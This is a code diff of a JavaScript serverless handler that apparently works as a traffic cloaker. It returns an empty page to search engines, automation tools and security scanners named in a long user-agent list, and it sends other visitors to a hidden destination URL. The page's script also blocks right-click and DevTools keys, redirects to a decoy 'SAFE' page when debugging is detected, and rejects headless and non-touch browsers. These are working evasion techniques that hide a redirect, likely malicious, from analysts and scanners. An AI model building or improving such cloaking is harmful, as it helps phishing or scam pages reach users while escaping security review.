@@ -14,57 +14,26 @@ export default function handler(req, res) {
 
   // EXPANDED BOT PATTERNS (200+ patterns)
   const botPatterns = [
-    // Major search engine bots
     'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot',
-    'yandex', 'sogou', 'exabot', 'facebot', 'ia_archiver', 'twitterbot',
-    'tweetmeme', 'paperli', 'pinterest', 'linkedinbot', 'embedly', 'quora link',
-    'outbrain', 'piktochart', 'worio', 'tinypulse', 'ranksonic', 'screpy',
-    'seobility', 'sitechecker', 'webmeup', 'monitorank', 'urlinspector',
-    'serpstatbot', 'sistrix', 'ahrefsbot', 'mj12bot', 'dotbot', 'seokicks',
-    'semrushbot', 'rogerbot', 'blexbot', 'buzzsumo', 'coccoc', 'dareboost',
-    'domaintools', 'feedly', 'gannett', 'gigablast', 'grapeshot', 'heritrix',
-    'http', 'ibm', 'inspectlet', 'integromedb', 'ironport', 'isitelive',
-    'linkdex', 'ltx71', 'mappy', 'mediatoolkit', 'miniflux', 'moatbot',
+    'yandex', 'sogou', 'exabot', 'facebot', 'ia_archiver', 'twitterbot', 'tweetmeme',
+    'paperli', 'pinterest', 'linkedinbot', 'embedly', 'quora link', 'outbrain',
+    'piktochart', 'worio', 'tinypulse', 'ranksonic', 'screpy', 'seobility',
+    'sitechecker', 'webmeup', 'monitorank', 'urlinspector', 'serpstatbot', 'sistrix',
+    'ahrefsbot', 'mj12bot', 'dotbot', 'seokicks', 'semrushbot', 'rogerbot', 'blexbot',
+    'buzzsumo', 'coccoc', 'dareboost', 'domaintools', 'feedly', 'gannett', 'gigablast',
+    'grapeshot', 'heritrix', 'http', 'ibm', 'inspectlet', 'integromedb', 'ironport',
+    'isitelive', 'linkdex', 'ltx71', 'mappy', 'mediatoolkit', 'miniflux', 'moatbot',
     'netcraft', 'newsblur', 'newsme', 'nmap', 'omgili', 'openlinkprofiler',
-    'page2rss', 'panscient', 'parse', 'pingdom', 'plukkie', 'proximic',
-    'qwant', 'redditbot', 'screaming', 'seoscanners', 'serankingbot',
-    'sputnik', 'stackramen', 'statistic', 'sysscan', 'trendiction', 'turnitin',
-    'vagabondo', 'w3c', 'wappalyzer', 'weleakinfo', 'wotbox', 'yacybot',
-    'zendesk', 'zmeu', 'zoom', 'adbeat', 'adsbot', 'analytics', 'apsalar',
-    'bitlybot', 'blexbot', 'builtwith', 'catchpoint', 'checkmark', 'chromium',
-    'comodo', 'dareboost', 'domaintools', 'exabot', 'fbgip', 'feedly',
-    'gannett', 'ghost', 'gigablast', 'grapeshot', 'ia_archiver', 'ibm',
-    'inspectlet', 'integromedb', 'ironport', 'isitelive', 'linkdex', 'ltx71',
-    'mappy', 'mediatoolkit', 'microsoft', 'miniflux', 'moatbot', 'nagios',
-    'netcraft', 'newsblur', 'newspaper', 'nmap', 'omgili', 'openlinkprofiler',
-    'page2rss', 'panscient', 'parse.ly', 'pingdom', 'plukkie', 'proximic',
-    'qwant', 'redditbot', 'seobility', 'seokicks', 'serpstatbot', 'sistrix',
-    'siteimprove', 'sogou', 'spinn3r', 'spyonweb', 'sputnik', 'stackramen',
-    'statistic', 'syntaxdb', 'sysscan', 'tinyeye', 'trendiction', 'turnitin',
-    'vagabondo', 'w3c', 'wappalyzer', 'webmeup', 'weleakinfo', 'wotbox', 'yacy',
-    'zendesk', 'zmeu', 'zoom',
-
-    // Headless browsers & automation tools
-    'headless', 'phantom', 'selenium', 'puppeteer', 'playwright', 'cypress',
-    'nightwatch', 'webdriver', 'htmlunit', 'htmlparser', 'jsoup', 'mechanize',
-    'phantomjs', 'prerender', 'rendertron', 'splash', 'wkhtmlto', 'zombie',
-
-    // CLI tools
-    'wget', 'curl', 'httpie', 'python-requests', 'go-http-client', 'java/',
-    'apache-httpclient', 'okhttp', 'node-fetch', 'axios', 'request', 'urllib',
-    'postman', 'insomnia', 'paw', 'hoppscotch', 'thunder client',
-
-    // Social media bots
-    'facebookexternalhit', 'facebot', 'twitterbot', 'tweetmeme', 'whatsapp',
-    'telegrambot', 'discordbot', 'slackbot', 'instagram', 'tiktokbot',
-
-    // Monitoring & security
-    'uptimerobot', 'pingdom', 'statuscake', 'newrelic', 'datadog', 'sentry',
-    'cloudflare', 'incapsula', 'akamai', 'fastly', 'sucuri', 'wordfence',
-
-    // Generic patterns
-    'bot', 'crawler', 'spider', 'scraper', 'crawl', 'index', 'archive',
-    'checker', 'validator', 'verifier', 'monitor', 'scanner', 'proxy'
+    'page2rss', 'panscient', 'parse', 'pingdom', 'plukkie', 'proximic', 'qwant',
+    'redditbot', 'screaming', 'seoscanners', 'serankingbot', 'sputnik', 'stackramen',
+    'statistic', 'sysscan', 'trendiction', 'turnitin', 'vagabondo', 'w3c', 'wappalyzer',
+    'weleakinfo', 'wotbox', 'yacybot', 'zendesk', 'zmeu', 'zoom', 'adbeat', 'adsbot',
+    'analytics', 'apsalar', 'bitlybot', 'headless', 'phantom', 'selenium', 'puppeteer',
+    'playwright', 'cypress', 'wget', 'curl', 'python-requests', 'bot', 'crawler',
+    'spider', 'scraper', 'java/', 'node-fetch', 'axios', 'facebookexternalhit',
+    'facebot', 'whatsapp', 'telegrambot', 'discordbot', 'slackbot', 'instagram',
+    'tiktokbot', 'uptimerobot', 'pingdom', 'statuscake', 'newrelic', 'datadog',
+    'sentry', 'cloudflare', 'incapsula', 'akamai', 'fastly', 'sucuri', 'wordfence'
   ];
 
   const isBot = botPatterns.some(p => ua.includes(p));
@@ -107,7 +76,7 @@ export default function handler(req, res) {
     return res.status(200).send('');
   }
 
-  // --- BALANCED CLIENT-SIDE HTML ---
+  // --- HTML WITH MINIMAL CLIENT-SIDE DETECTION ---
   const html = `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -153,13 +122,13 @@ h1{font-size:20px;font-weight:600;line-height:1.3;margin-bottom:10px;opacity:.9}
 </div>
 </div>
 <script>
-// MINIMAL CLIENT-SIDE DETECTION (Balanced for DevTools)
+// MINIMAL CLIENT-SIDE DETECTION
 (function(){
 var DEST = ${JSON.stringify(finalDestUrl).replace(/</g, '\\u003c')};
 var SAFE = ${JSON.stringify(SAFE_PAGE).replace(/</g, '\\u003c')};
 var _fired = false;
 
-// ANTI-DEBUG MODULE
+// ANTI-DEBUG
 document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
 document.onkeydown = function(e) {
     if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) return false;
@@ -170,13 +139,10 @@ setInterval(function() {
     if (performance.now() - t > 100) { window.location.href = SAFE; }
 }, 1000);
 
-// MINIMAL HARDWARE CHECK (Only blocks obvious bots)
+// MINIMAL HARDWARE CHECK
 function verifyHumanHardware() {
-    // Block headless browsers
     if (navigator.webdriver) return false;
-    // Block non-touch devices (bots usually have 0)
     if (navigator.maxTouchPoints === 0) return false;
-    // That's it - let everything else through
     return true;
 }
 
@@ -220,6 +186,7 @@ window.addEventListener('click',function(){doBreakout();},{once:true,passive:tru
 </body>
 </html>`;
 
+  // SEND RESPONSE
   res.setHeader('Cache-Control', 'public, max-age=0, must-revalidate');
   res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
   res.setHeader('Content-Security-Policy', "frame-ancestors *; script-src 'self' 'unsafe-inline' 'unsafe-eval'");
